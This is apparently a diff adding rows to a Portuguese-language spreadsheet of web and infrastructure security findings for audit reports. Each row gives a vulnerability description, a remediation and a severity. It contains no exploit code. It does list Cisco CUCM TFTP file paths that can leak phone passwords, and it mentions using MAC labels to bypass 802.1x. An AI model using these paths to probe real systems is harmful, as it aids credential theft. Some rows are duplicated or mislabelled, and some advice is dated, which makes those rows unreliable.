+;;;Listagem de Diretórios;É possível listar diretórios publicados e ter acesso a conteúdos que não deveriam ser acessíveis.;;Listagem de Diretórios;"Configurar o servidor IIS e/ou Apache para não permitir listagem de diretórios.<br/><br/>Para o servidor Apache remova todas as entradas ""Indexes"" desnecessárias, das seções de ""Directory"" do arquivo apache2.conf ou httpd.conf. <br/><br/><br/><br/>Para o servidor IIS 6.0 vá até as propriedades do site no painel de gerenciamento do IIS e desabilite a opção “Directory Browsing”, como mostra a imagem no link abaixo.<br/><br/>http://juliusphua.com/wp-content/uploads/2010/05/IIS6_DirectoryBrowsing.jpg";-;;;LOW;;;;;;;;;;;;;;;;;
+;;;Lógica de negócios;Os formulários da aplicação estão permitindo a inserção de caracteres sensíveis (como -/<>*&%$#). Caso não haja nenhum tipo de validação, esses caracteres podem ser utilizados para a construção de trechos de código malicioso que, poderão, enfim, ser executados pelo servidor ou pelo navegador.;;Lógica de negócios;"- A aplicação deve manter uma ordem crescente nas etapas de preenchimento do formulário;<br/><br/>- Deve ser utilizada uma máscara de entrada para evitar que letras sejam inseridas em campos onde serão utilizados apenas números;<br/><br/>- Deve ser criado um sistema de validação de dados para todos os campos, de modo a não permitir a inserção de números negativos ou caracteres especiais.<br/><br/><br/><br/>Referência:<br/><br/>http://www.owasp.org/index.php/Data_Validation";-;;;MEDIUM;;;;;;;;;;;;;;;;;
+;;;Loops no processamento de dados;Foi observado que a aplicação está possibilitando a negação de serviço, por meio de loops de processamento.<br/><br/><br/><br/>Esta situação ocorre por meio de submissão de repetitivos valores em variáveis vulneráveis e tal vulnerabilidade existe devido a variáveis vulneráveis e/ou erros no código fonte, que fazem com que o sistema entre em um loop infinito de processamento, preenchendo todo o buffer da memória RAM e levando o sistema ao DoS.;;Loops no processamento de dados;Deve ser usadas funções no sistema que limitem a quantidade de dados que o servidor conseguirá processar por ciclo, mantendo assim a consistência do servidor.<br/><br/>Caso necessário o código fonte deverá ser revisado a fim de corrigir erros no mesmo ou substituir o uso de funções inadequadas.;-;;;MEDIUM;;;;;;;;;;;;;;;;;
+;;;Negação de serviço por bloqueio de contas;A aplicação está configurada para bloquear contas de usuários após 3 tentativas erradas de autenticação.Com isso, um usuário mal-intencionado pode efetuar intencionalmente um ataque de força-bruta, com o objetivo de causar o bloqueio de contas de usuários.<br/><br/>Esta situação causaria a negação de serviço, pois impossibilitaria legítimos usuários de vir a ter acesso ao sistema.;;Negação de serviço por bloqueio de contas;Deve-se desabilitar o sistema de bloqueio de conta por tentativas erradas e adicionar um sistema de CAPTCHA após<br/><br/>3 tentativas de usuário ou senha errada, a fim de conter ataques de descoberta de credenciais.;-;;;MEDIUM;;;;;;;;;;;;;;;;;
+;;;Negação de Serviço por Buffer Overflows;Buffer Overflow ocorre quando uma aplicação tenta interpretar mais informação do que suporta, causando o transbordamento no local onde a mesma estava alocada na memória RAM. Ocorrendo o estouro do buffer da memória, é possível a execução de códigos maliciosos ou ainda ocasionar uma negação de serviço (DoS) na aplicação.<br/><br/>Devido à falta de funções de controles para limitar o fluxo de entrada de dados, a aplicação encontra-se vulnerável.;;Negação de Serviço por Buffer Overflows;"Para evitar buffer overflow, deve-se:<br/><br/><br/><br/>- Evitar o uso de variáveis vulneráveis no código fonte;<br/><br/>- Revisar o código fonte a fim de corrigir erros no código;<br/><br/>- Utilizar variáveis de controle que tenham a capacidade de limitar a quantidade máxima de bytes que a aplicação poderá alocar na memória;<br/><br/>- Manter o sistema e módulos dos servidores sempre atualizados;<br/><br/>- Pode ser utilizada alguma solução para a prevenção de estouro de buffer. Programas como (StackGuard, StackShield, ProPolice, Comodo Memory Firewall, Libsafe/ Libverify, Microsoft Visual Studio / GS flag, etc.).";-;;;MEDIUM;;;;;;;;;;;;;;;;;
+;;;Ordem de processamento desordenada;Foi observado que na situação onde a aplicação teve que processar duas requisições diferentes, mas da mesma página e simultaneamente, a mesma não conseguiu realizar uma diferenciação entre as requisições, com efeito o servidor emitiu uma resposta idêntica para ambas as requisições.<br/><br/><br/><br/>Na presente situação, foi possível realizar a aquisição de um produto com um valor abaixo do original.;;Ordem de processamento desordenada;Por meio de um identificador único o servidor deverá analisar cada requisição como sendo única, de modo a processar e emitir a resposta adequada para seu devido requisitante.;-;;;INFORMATIVE;;;;;;;;;;;;;;;;;
+;;;Páginas administrativas disponíveis para internet;Interfaces administrativas podem estar presentes na aplicação ou no servidor de aplicativos para permitir que usuários realizem atividades privilegiadas no site. Essa funcionalidade pode ser acessada por um usuário não autorizado ou fora do padrão.;;Páginas administrativas disponíveis para internet;Verificar a possibilidade de liberação destas interfaces apenas para hosts especificos;-;;;LOW;;;;;;;;;;;;;;;;;
+;;;Páginas e aplicações padrão;Foram identificadas páginas padrão da aplicação disponível publicamente.<br/><br/><br/><br/>Páginas ou aplicações padrão podem revelar informações sobre as configurações do servidor em questão, tal como também informações sigilosas sobre a aplicação e seu funcionamento. Esta ocorrência ajuda no levantamento de informações e busca por vulnerabilidades para que terceiros mal-intencionados possam estruturar um ataque com maior eficiência.;;Páginas e aplicações padrão;Deve-se remover todo conteúdo que não seja relacionado com a aplicação, tal como páginas padrão e todo conteúdo publicado que não seja estritamente necessário para o correto funcionamento do servidor e aplicação.;-;;;LOW;;;;;;;;;;;;;;;;;
+;;;Redirecionamento de URL;"Foi observado que a aplicação não está validando adequadamente a URL ao qual a requisição é realizada e posteriormente submetida, de modo, que é possível por meio de uma injeção maliciosa, redirecionar um usuário (vítima) para um site malicioso.<br/><br/>Esta situação, permite um usuário mal-intencionado à realizar um phishing attack; por exemplo, clonar o site verdadeiro e utilizar um site fake, redirecionando a vítima para o mesmo, a fim de capturar a credencial da mesma, ou mesmo infectar inúmeros computadores, para utilizá-los como bots.";;Redirecionamento de URL;Deve-se validar todas as entradas de dados nas requisições, a fim de que a aplicação não aceite caracteres não esperados, e não permita a submissão/redirecionamento de informações e usuários para domínios não autorizados.;-;;;MEDIUM;;;;;;;;;;;;;;;;;
+;;;Replay em Web Services;Não foi encontrado nenhum sistema que valide a origem e o conteúdo das requisições submetidas do cliente para a Web Services.<br/><br/>Com efeito, foi possível interceptar um arquivo XML submetido por um cliente, e reenviá-lo com conteúdo malicioso. Tal ação foi realizada em nome do cliente de origem.;;Replay em Web Services;"- Deve-se fazer uso da versão mais atual do protocolo SSL/TLS, como canal de comunicação seguro;<br/><br/>- Deve-se adotar o sistema de mutua autenticação, entre o cliente e servidor de destino.";-;;;MEDIUM;;;;;;;;;;;;;;;;;
+;;;Retrocessão de diretórios;A retrocessão de diretório (Directory Traversal) permite que usuários não autorizados acessem diretórios restritos dentro do sistema.;;Retrocessão de diretórios;"Deve-se manter desativado o Directory Traversal no servidor Web.<br/><br/><br/><br/>Para servidores IIS:<br/><br/>Abra o Console de gerenciamento do IIS;<br/><br/>Clique com o botão direito na pasta Web Site;<br/><br/>Clique em Properties no menu pop-up;<br/><br/>Clique na aba Home Directory;<br/><br/>Clique no botão, Configuration;<br/><br/>Na aba Options desabilite a opção Enable Parent Paths.<br/><br/>Clique em OK.<br/><br/><br/><br/>Para servidores Apache:<br/><br/>Caso não haja específica utilidade deve ser removida a opção FollowSymlinks das seções de Directory do apache2.conf, httpd.conf e demais arquivos em /etc/apache2/sites-enabled/";-;;;MEDIUM;;;;;;;;;;;;;;;;;
+;;;Reuso de CAPTCHA;Foi possível reutilizar um captcha anteriormente utilizado em outra sessão.<br/><br/>Com efeito, um usuário mal-intencionado poderia programar um ataque em massa utilizando sempre o mesmo captcha, já que o mesmo é sempre aceito pelo servidor.;;Reuso de CAPTCHA;Deve ser implementado um sistema de validação de captchas, de modo a ser verificado se o captcha submetido já foi utilizado. Caso o captcha já tenha sido utilizado o sistema deverá negar a requisição.<br/><br/>Recomenda-se que o captcha seja removido de sua base de dados, após sua utilização.;-;;;LOW;;;;;;;;;;;;;;;;;
+;;;XML Injection;Por meio de meta-caráter foi possível injetar strings maliciosas no arquivo XML que faz chamada ao banco de dados, de modo a armazenar dados maliciosos no DB.;;XML Injection;Deve-se também sanitizar/filtrar as entradas de dados feitas por usuários para não aceitar caracteres e expressões não esperadas pela aplicação. Normalmente, os caracteres que devem ser fitlrados são <,>,(,),%,$,”,´,`, além de suas várias codificadas.;-;;;HIGH;;;;;;;;;;;;;;;;;
+;;;XPath Injection;XPath é uma linguagem de programação que permite construir expressões que recorrem e processam um documento XML.<br/><br/><br/><br/>Injetando dados maliciosos na query de autenticação do arquivo XML, foi possível autenticar na aplicação, sem ter conhecimento de alguma credencial.;;XPath Injection;Deve-se também sanitizar/filtrar as entradas de dados feitas por usuários para não aceitar caracteres e expressões não esperadas pela aplicação. Normalmente, os caracteres que devem ser fitlrados são <,>,(,),%,$,”,´,`, além de suas várias codificadas.;-;;;HIGH;;;;;;;;;;;;;;;;;
+V;;;Aplicação suscetível a ataques de força bruta;"A funcionalidade de autenticação deve sempre conter um CAPTCHA (Completely Automated Public Turing test to tell Computers and Humans Apart) ou reCAPTCHA para dificultar a execução de ataques de força bruta no formulário. Assim como é recomendável estabelecer um limite de tentativas erradas de login para um único usuário, bloqueando-o temporariamente.A mensagem de erro para usuário incorreto deve ser igual à mensagem de erro para um usuário correto e senha incorreta, por exemplo “Usuário e/ou senha incorreto, por favor verifique novamente”.A validação do processo de autenticação deve ocorrer no lado do servidor, nunca do lado do cliente, além disso, deve ser utilizado serviços de autenticação padronizados e centralizados.";-;Aplicação suscetível a ataques de força bruta;"A funcionalidade de autenticação deve sempre conter um CAPTCHA (Completely Automated Public Turing test to tell Computers and Humans Apart) ou reCAPTCHA para dificultar a execução de ataques de força bruta no formulário. Assim como é recomendável estabelecer um limite de tentativas erradas de login para um único usuário, bloqueando-o temporariamente.A mensagem de erro para usuário incorreto deve ser igual à mensagem de erro para um usuário correto e senha incorreta, por exemplo “Usuário e/ou senha incorreto, por favor verifique novamente”.A validação do processo de autenticação deve ocorrer no lado do servidor, nunca do lado do cliente, além disso, deve ser utilizado serviços de autenticação padronizados e centralizados.";Gerenciamento de Acessos;Mecanismo contra Força Bruta;;MEDIUM;;https://www.owasp.org/index.php/Blocking_Brute_Force_Attacks;;;;;;;;;;;;;;;
+V;;;Função logout inadequada;"Quando o usuário clicar no botão sair ou o tempo de expiração do cookie de sessão exceder, a sessão do usuário deve ser finalizada integralmente, tanto no client-side quanto no server-side, ou seja, não se deve apenas retirar o cookie do navegador do usuário, mas sim invalidá-lo no servidor. Assim como o sessionID devem ser únicos, gerados de forma randômicas. É essencial que todas as páginas autenticadas da aplicação tenham disponível ao usuário um botão de logout, facilitando o encerramento de sessão partindo do cliente.Além disso, é recomendável haver uma funcionalidade que o usuário consiga visualizar suas sessões ativas.";-;Função logout inadequada;"Quando o usuário clicar no botão sair ou o tempo de expiração do cookie de sessão exceder, a sessão do usuário deve ser finalizada integralmente, tanto no client-side quanto no server-side, ou seja, não se deve apenas retirar o cookie do navegador do usuário, mas sim invalidá-lo no servidor. Assim como o sessionID devem ser únicos, gerados de forma randômicas. É essencial que todas as páginas autenticadas da aplicação tenham disponível ao usuário um botão de logout, facilitando o encerramento de sessão partindo do cliente.Além disso, é recomendável haver uma funcionalidade que o usuário consiga visualizar suas sessões ativas.";Gerenciamento de Acessos;Mecanismo de logout;;MEDIUM;;;;;;;;;;;;;;;;;
+V;;;Acessos indevidos a arquivos e informações;Em sistemas com privilégios de acessos diferentes dos usuários é possível que as limitações de acesso não sejam feitas corretamente, essa falha pode permitir que um usuário seja capaz de acessar funcionalidades ou recursos que não possui autorização.;-;;"É importante negar todos os acessos caso a aplicação não consiga acessar as informações contidas na configuração de segurança mínima definida na aplicação e no servidor web.Os seguintes acessos devem ser disponibilizados somente aos usuários autorizados:_ Arquivos e outros recursos, incluindo aqueles que estão fora do controle direto da aplicação;_ URLs protegidas;_ Funções protegidas;_ Referências diretas aos objetos (não incrementais).Caso os dados precisem ser armazenados obrigatoriamente no lado do cliente, deve-se utilizar mecanismos de criptografia e verificação de integridade (HASH) no lado do servidor para detectar possíveis adulterações e garantir que os fluxos lógicos da aplicação obedeçam às regras do negócio.Se for permitida a existência de sessões autenticadas por longos períodos de tempo, deve-se fazer a revalidação periódica da autorização do usuário para garantir que os privilégios não foram modificados e, caso tenham sido, realizar o registro em log do usuário e exigir uma nova autenticação. ";Gerenciamento de Acessos;Privilégios de acesso (Segregação de acesso);;;;https://www.owasp.org/index.php/Testing_for_Privilege_escalation_(OTG-AUTHZ-003);;;;;;;;;;;;;;;
+V;;;Proteção de informações sensíveis;É necessário garantir que não seja possível visualizar dados sensíveis ou desnecessários ao contexto do usuário;-;Proteção de informações sensíveis;"É necessário garantir que não seja possível visualizar dados sensíveis ou desnecessários ao contexto do usuário, sendo alguns exemplos de arquivos:- Códigos fontes em arquivos temporários: muitos editores de texto mantêm cópias temporárias (ou de backup) quando estão manipulando arquivos de texto, essas cópias geralmente não possuem extensões conhecidas pelo servidor e são mostradas em forma de texto ao usuário.- Arquivos de log: geralmente utilizados para depuração do funcionamento da aplicação, alguns desses arquivos podem conter informações sensíveis.- Listagem de diretórios: além de mostrar a estrutura de diretórios da aplicação, podem revelar arquivos com as características dos itens anteriores.- Código HTML: evitar utilizar dados sensíveis no código, nos campos HIDDEN ou em comentários detalhados, por exemplo. Muitos dos exemplos citados podem estar presentes em ambiente de desenvolvimento, ao migrar o ambiente para um ambiente produtivo, é necessário verificar se não há esse tipo de exposição, como, por exemplo, arquivos TMP, BKP, OLD, entre outros.No ambiente produtivo é necessário estar disponível somente os arquivos essenciais para o funcionamento da aplicação..";Gerenciamento de Acessos;Proteção de informações sensíveis ;;;;;;;;;;;;;;;;;;;
+v;;;Comunicação insegura entre cliente e servidor (HTTP);Deve-se sempre utilizar um canal seguro para a comunicação de dados entre cliente e servidor.;-;Comunicação insegura entre cliente e servidor (HTTP);"Deve-se sempre utilizar um canal seguro para a comunicação de dados entre cliente e servidor.A utilização do HTTPS com um protocolo de segurança seguro (TLSv1.2), com a flag HSTS (HTTP Strict Transport Security) é estritamente necessário para o tráfego de dados considerados confidenciais.É recomendável forçar a conexão diretamente pela porta 443, evitando redirecionamentos da porta 80 (HTTP) para a porta 443, isso dificulta a criação de um cenário que possibilita ataques de Man-In-The-Middle, situação em que um usuário mal-intencionado se posiciona entre o cliente e servidor para capturar a informação trafegada. ";Comunicação Segura;Utilização de canal de comunicação segura;;CRITICAL;;;;;;;;;;;;;;;;;
+v;;;Dados sensíveis trafegando via método POST;"O método POST deve ser utilizado sempre que haja a necessidade de tráfego de dados sensíveis, como por exemplo, senhas de usuários, tokens de sessão e dados do usuário.Na URL (método GET) devem ser trafegados somente dados não críticos que podem ser expostos.";-;Dados sensíveis trafegando via método POST;"O método POST deve ser utilizado sempre que haja a necessidade de tráfego de dados sensíveis, como por exemplo, senhas de usuários, tokens de sessão e dados do usuário.Na URL (método GET) devem ser trafegados somente dados não críticos que podem ser expostos.";Comunicação Segura;Utilização do método POST;;CRITICAL;;;;;;;;;;;;;;;;;
+V;;;Arquivos inapropriados armazenados por usuários;Arquivos impróprios/indevidos foram identificados durante a análise, o download desses arquivos muitas vezes inflige leis de direitos autorais, podendo acarretar em multas e processos judiciais para a empresa, ou conter códigos maliciosos que podem ser executados em segundo plano e impactar a Organização diretamente.;-;Arquivos inapropriados armazenados por usuários;"Deve-se implementar os seguintes controles:•        Regra de boqueio do uso de programas P2P;•        Filtros de conteúdo, restringindo o acesso a conteúdo indevido;•        Política de Segurança da Informação, onde defina as práticas de segurança corporativas, onde proíba a coleta, execução e armazenamento de conteúdos indevidos na Organização;•        Programa de conscientização, onde forneça palestras, pílulas de segurança, entre outras práticas, para conscientizar os usuários do uso correto dos recursos corporativos e evitar a exposição a riscos atrelados ao mal comportamento digital dos colaboradores.";Conscientização;;;;;;;;;;;;;;;;;;;;
+V;;;A aplicação apresenta inconsistência.;Inconsistências na execução da aplicação podem gerar comportamentos inesperados, causando problemas como vazamento de informações ou serviço indisponível, por exemplo.;-;A aplicação apresenta inconsistência.;Deve-se investigar a causa da ocorrência em questão, a fim de evitar o mesmo comportamento em ambiente de produção.;Desenvolvimento Seguro;;;INFORMATIVE;;;;;;;;;;;;;;;;;
+V;;;A aplicação contém campo password com atributo autocomplete habilitado;O servidor web está disponibilizando um formulário HTML contendo uma entrada do tipo “password” cujo o parâmetro 'autocomplete' não está configurado com a opção 'off'. Dessa forma as credenciais de acesso ficam armazenadas no navegador permitindo a um atacante poderá obter informações sensíveis.;-;A aplicação contém campo password com atributo autocomplete habilitado;Adicionar o atributo 'autocomplete=off' nos campos do tipo “Password” no formulário da aplicação web, para prevenir que o navegador armazene dados sensíveis.;Desenvolvimento Seguro;;;;;;;;;;;;;;;;;;;;
+V;;;A aplicação permite falsificação de e-mail;"A aplicação permite falsificação de e-mail, onde é possível enviar e-mails em nome da Organização sem autorização, utilizando o próprio serviço de e-mail corporativo.Através do javascript implementado na aplicação, é possível alterar o endereço de destino do e-mail inserido na aplicação, do lado do cliente.Usuários mal-intencionados podem realizar ataques de engenharia social/phishing através desta vulnerabilidade para enviar e-mails falsos em nome da Organização.";-;A aplicação permite falsificação de e-mail;Definir os parâmetros de envio de e-mail do lado do servidor. O destinatário deve estar em uma configuração interna da aplicação e não no script executado no cliente (Browser).;Desenvolvimento Seguro;;OWASP - A6 – Security Misconfiguration;Crítico;;;;;;;;;;;;;;;;;
+;;Comunicação insegura entre cliente e servidor (HTTP);A aplicação não utiliza um protocolo seguro para autenticação do usuário;EXCLUIR;EXCLUIR;EXCLUIR;EXCLUIR;-;;;;;;;;;;;;;;;;;;;;
+V;;;Informações Sensíveis Submetidas na URL;Informações sensíveis estão sendo submetidas na URL, permitindo a descoberta de informações críticas, assim como o mesmo é armazenado em logs, ferindo o princípio de confidencialidade.;-;Informações Sensíveis Submetidas na URL;"Deve-se implementar os seguintes controles:- Utilizar o método POST sempre que informações sensíveis forem enviadas do cliente para o servidor e vice-versa;- Utilizar certificado digital válido nessa comunicação (HTTPS) com a flag HSTS.";Desenvolvimento Seguro;;;LOW;;;;;;;;;;;;;;;;;
+V;;;Mensagem de erro inadequada;"Um aspecto importante do desenvolvimento seguro de aplicações é evitar o vazamento de informações. Na tentativa da aplicação processar uma requisição não esperada, a mesma apresentou uma tela com a depuração da exceção ocorrida, devido à falha no processo.Com efeito, as informações exibidas ajudam o usuário mal-intencionado a identificar detalhes da aplicação, trechos de código, bibliotecas utilizadas, entre outras falhas na aplicação. Estas informações são úteis para a elaboração de um ataque mais elaborado a organização.Um caso que mensagens de erro são importantes para ataques é a exposição de mensagens geradas pelo banco de dados para a execução de injeção de comandos SQL.Outro exemplo bastante útil ao usuário mal-intencionado é o path disclosure, situação em que a mensagem de erro exibe informações relativas ao caminho de diretórios da aplicação, baseadas no sistema de arquivos do servidor que a hospeda. Esse tipo de informação pode ser importante quando o usuário mal-intencionado visa executar ataques de path traversal ou explorar falhas em componentes de upload, podendo posicionar os arquivos de sua escolha em lugares específicos do servidor de aplicações.A inibição das mensagens de erro com informações fará com que esses ataques sejam feitos “às cegas”, uma vez que as tecnologias que suportam a aplicação não lhes forneceram informações sobre erros ou acertos de suas tentativas, dificultando a execução de um ataque rápido e bem-sucedido.";-;Mensagem de erro inadequada;"Mensagens de erro não tratadas que são excessivamente descritivas auxiliam a obtenção de informações úteis para a execução de ataques.As mensagens de erro devem ser tratadas, de maneira que não exponham:_ Nomes de classes e métodos do código;_ Paths;_ Alertas de inconsistência de “tipagem”;_ Alertas de inconsistência no número de parâmetros variáveis;_ Nomes de tabelas, colunas e informações da base de dados.Sendo assim, quaisquer mensagens que reportem erros em tempo de execução oriundos da tecnologia utilizada, seja na aplicação ou na tecnologia agregada a ela (servidor de aplicação ou banco de dados, por exemplo), não devem ser exibidas em ambientes produtivos.";Gerenciamento de Configuração;Tratamento de mensagens de erro;OWASP - A6 – Security Misconfiguration;-;;https://www.owasp.org/index.php/Error_Handling;;;;;;;;;;;;;;;
+V;;;Recuperação de senha;Não foi identificado a função de recuperação de senha, uma vez que o sistema atual depende de um administrador para criar uma nova senha e informá-la ao usuário. Este procedimento não é adequado, pois é passível a erro humano e fere questões de privacidade e não-repúdio.;-;Recuperação de senha;Deve-se criar um processo automatizado de recuperação de senha, por meio de uma função “esqueci minha senha” na tela de login. Podendo ser realizado através de um campo, onde o usuário pode inserir seu e-mail cadastrado e, caso válido, enviar um link único e randômico para a troca de senha. Esse link deve ter validade única e tempo de expiração de um dia a fim de evitar mal-uso.;Desenvolvimento Seguro;;;LOW;;;;;;;;;;;;;;;;;
+;;Recuperação de senha;Recuperação de senha através de perguntas/respostas;Foi observado que o atual mecanismo de recuperação de senha baseia-se em um sistema de pergunta e resposta.<br/><br/>Este atual sistema faz uso de perguntas consideradas fracas, ou seja, cuja resposta torna-se fácil se descobrir.;-;Recuperação de senha através de perguntas/respostas;- Deve-se fazer uso de 6 perguntas para o mecanismo de pergunta/resposta.<br/><br/><br/><br/>Ou <br/><br/><br/><br/>- Deve-se criar um sistema automatizado de recuperação de senha, por meio de uma função “esqueci minha senha” na tela de login.<br/><br/>Uma das formas é fornecer o campo para o usuário inserir seu email cadastrado e, caso válido, enviar um link único e randômico para a troca de senha. <br/><br/>Esse link deve ter validade única e tempo de expiração de um dia a fim de evitar mal uso.;Desenvolvimento Seguro;;;LOW;;;;;;;;;;;;;;;;;
+V;;;A aplicação está vulnerável a Clickjacking;"A aplicação está vulnerável a ataques de Clickjacking permitindo a um usuário mal-intencionado criar múltiplas camadas em um botão, link ou página fazendo com que os usuários sejam redirecionados para uma página maliciosa.A aplicação pode ser executada dentro de um tag iframe de uma página maliciosa. A partir desse momento, usuários mal-intencionado podem criar uma página falsa, induzindo usuários legítimos a inserirem dados, que podem ser capturados pelo mesmo.";-;A aplicação está vulnerável a Clickjacking;Deve-se ativar o cabeçalho X-Frame-Options no servidor web;Gerenciamento de Configuração;;;INFORMATIVE;;;;;;;;;;;;;;;;;
+V;;;Acesso a Informações do Telefone IP Cisco (CTFTP);"O serviço TFTP é um servidor HTTP personalizado que escuta na porta TCP 6970. Através desse serviço é possível acessar determinados arquivos, como arquivos de configuração dos telefones IP, os quais podem conter senhas de acesso para o Cisco Unified Communications Manager (CUCM). Outros arquivos no serviço HTTP podem revelar informações e configurações relacionadas a infraestrutura.Os seguintes caminhos codificados podem ser usados para divulgar informações sobre a configuração do CUCM:Lista de arquivos TFTP /ConfigFileCacheList.txt incluindo nome do arquivo de configuração do telefone (que pode conter senhas);Outros locais:/BinFileCacheList.txt/FileList.txt/PerfMon.txt/ParamList.txt/lddefault.cfg";-;Acesso a Informações do Telefone IP Cisco (CTFTP);"Como forma de recomendação para correção da vulnerabilidades, é importante que a empresa implemente:•        Segmentação da rede de voz em relação à rede de dados (VLANs);•        Para impressoras e outros dispositivos sem suporte ao protocolo 802.1x, utilizar um firewall para garantir que em caso de algum tipo de acesso, a comunicação fique restrita somente aos serviços necessário dentro daquele escopo de rede;•        Bloquear o acesso do usuário as configurações no telefone IP (Desabilitar o acesso ao Settings Access dentro do CUCM);•        Retirar a etiqueta no telefone IP, onde possui o endereço MAC, pois caso essa informação seja coletada, é possível realizar o bypass do protocolo 802.1x;•        Em caso do dispositivo oferecer suporte, configurar os mesmos para que utilizem o protocolo 802.1x para acesso seguro à rede;•        Monitorar tráfego na VLAN de voz, para identificar ações maliciosas";Gerenciamento de Configuração;;;;;;;;;;;;;;;;;;;;
+V;;;Aplicação Bind - Negação de Serviço por Buffer Overflow;"O transbordamento de dados, conhecido como Buffer Overflow ocorre quando uma aplicação tenta interpretar mais informações do que suporta, causando o transbordamento no local onde a mesma estava alocada na memória RAM. Ocorrendo o estouro do buffer da memória é possível a execução de códigos maliciosos ou ainda ocasionar uma negação de serviço (DoS) na aplicação.Devido à falta de funções de controles para limitar o fluxo de entrada de dados, a aplicação encontra-se vulnerável. A exploração dessa vulnerabilidade tornaria o serviço indisponível a toda operação da empresa que dependa desse serviço.";-;Aplicação Bind - Negação de Serviço por Buffer Overflow;Para aplicar a atualização de segurança no programa vulnerável (Bind) siga a instrução em: https://access.redhat.com/articles/11258#rhel6;Gerenciamento de Configuração;;;CRITICAL;;https://my.simplercloud.com/index.php?/news/view/47/critical-alert--bind-tkey-vulnerability-affecting-linux-systems-running-bind-dns-server---cve-2015-5477/;https://access.redhat.com/articles/11258#rhel6;;;;;;;;;;;;;;
+V;;;Bypass no Mecanismo de Autenticação;"Foi possível burlar o mecanismo de autenticação, ou seja, é possível acessar o sistema mesmo sem ter conhecimento de um usuário e senha válido.Neste caso o bypass foi realizado por meio da técnica PTH (Pass-The-Hash) onde o usuário mal-intencionado faz uso de um hash coletado em um sistema e o utiliza para comprometer em outro, sem a necessidade de identificar a senha correspondente ao hash.";-;Bypass no Mecanismo de Autenticação;"Deve-se implementar as seguintes recomendações:•        Isolar sistema sensível: Defina uma conta apenas para a execução deste serviço.•        Reduzir o privilégio de acesso dos usuários;•        Evite o uso de LM e NTLM challenge response;•        Limite credenciais em cache•        Monitore o servidor";Gerenciamento de Configuração;;;;;https://www.sans.org/reading-room/whitepapers/testing/pass-the-hash-attacks-tools-mitigation-33283;https://www.csoonline.com/article/2622729/stop-pass-the-hash-attacks-before-they-begin.html;;;;;;;;;;;;;;
+V;;;Compartilhamento indevido de arquivos via Microsoft Windows SMB;O serviço de compartilhamento Windows está disponibilizando informações sensíveis para usuários não autorizados.;-;Compartilhamento indevido de arquivos via Microsoft Windows SMB;Restrinja o acesso aos diretórios apenas as pessoas que devem ter acesso ao mesmo. Para restringir o acesso, no Windows abra o Explorer, clique com o botão direito em cada pasta compartilhada, acesse a aba 'compartilhamento' e clique em 'permissões'.;Gerenciamento de Configuração;;;;;;;;;;;;;;;;;;;;
+V;;;Cookie - Ausência do atributo Domain;"O atributo path direciona o browser a enviar o cookie apenas para o domínio especifico e subdomínios. Se o atributo for definido por padrão como a raiz (""/"") do website — pode provocar riscos adicionais à segurança desta aplicação, pois não haverá restrições de envio de cookies para outras aplicações que eventualmente estejam hospedadas em outros diretórios do mesmo servidor web.Exemplo 1: Suponha-se que existem duas aplicações no mesmo servidor em pastas distintas, uma em /site1/ e outra em /site2/. O fato de não restringir o escopo do cookie a uma aplicação, fará com que o cookie desta seja acessível para ambas as aplicaçõesExemplo 2:Uma aplicação que encontra-se no domínio xx.com.br e no path /app, no momento que o cookie é recebido no navegador, se a configuração do domínio for enviado como *xx.com.br e no path /, o cookie torna-se acessível para qualquer subdomínio do servidor ou qualquer outra aplicação em um path diferente do previsto, sendo que é recomendável que as configurações deveriam ser definidas para xx.com.br (domain) e /app (path).";-;Cookie - Ausência do atributo Domain;"Deve-se implementar os seguintes controles:1. Restringir o escopo das configurações dos cookies, como as diretivas de path, domain e expire.2. Habilitar no servidor web:• ""X-Frame-Options: SAMEORIGIN”;• ""X-XSS-Protection: 1; mode=block""3. Implementar certificado digital válido com a flag HSTS";Gerenciamento de sessão;;;Baixo;;;;;;;;;;;;;;;;;
+V;;;Cookie - Ausência do atributo HTTP Only;"O atributo HTTPOnly especifica que os cookies não serão acessíveis por nenhum script no navegador (client-side)A falta deste atributo permite que o identificador de sessão seja lido por algum script executando no navegador, possibilitando sua captura e, consequentemente, a personificação da sessão de usuários válidos.";-;Cookie - Ausência do atributo HTTP Only;"Deve-se implementar os seguintes controles:1. Habilitar o atributo HttpOnly nos cookies 2. Habilitar no servidor web:• ""X-Frame-Options: SAMEORIGIN”;• ""X-XSS-Protection: 1; mode=block""3. Implementar certificado digital válido com a flag HSTS";Gerenciamento de sessão;;OWASP - A6 – Security Misconfiguration;Baixo;;https://www.owasp.org/index.php/HttpOnly;;;;;;;;;;;;;;;
+V;;;Cookie - Ausência do atributo Path;"O atributo path direciona o browser a enviar o cookie apenas para o domínio especifico e subdomínios. Se o atributo for definido por padrão como a raiz (""/"") do website — pode provocar riscos adicionais à segurança desta aplicação, pois não haverá restrições de envio de cookies para outras aplicações que eventualmente estejam hospedadas em outros diretórios do mesmo servidor web.Exemplo 1: Suponha-se que existem duas aplicações no mesmo servidor em pastas distintas, uma em /site1/ e outra em /site2/. O fato de não restringir o escopo do cookie a uma aplicação, fará com que o cookie desta seja acessível para ambas as aplicaçõesExemplo 2:Uma aplicação que encontra-se no domínio xx.com.br e no path /app, no momento que o cookie é recebido no navegador, se a configuração do domínio for enviado como *xx.com.br e no path /, o cookie torna-se acessível para qualquer subdomínio do servidor ou qualquer outra aplicação em um path diferente do previsto, sendo que é recomendável que as configurações deveriam ser definidas para xx.com.br (domain) e /app (path).";-;Cookie - Ausência do atributo Path;"Deve-se implementar os seguintes controles:1. Restringir o escopo das configurações dos cookies, como as diretivas de path, domain e expire.2. Habilitar no servidor web:• ""X-Frame-Options: SAMEORIGIN”;• ""X-XSS-Protection: 1; mode=block""3. Implementar certificado digital válido com a flag HSTS";Gerenciamento de sessão;;;Baixo;;;;;;;;;;;;;;;;;
